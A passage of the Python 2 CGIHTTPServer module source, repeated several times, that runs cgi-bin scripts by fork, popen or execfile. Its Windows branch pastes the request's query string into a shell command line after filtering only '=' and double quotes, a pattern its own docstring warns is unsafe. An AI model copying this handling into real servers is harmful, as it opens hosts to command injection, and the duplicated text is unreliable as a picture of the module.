        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
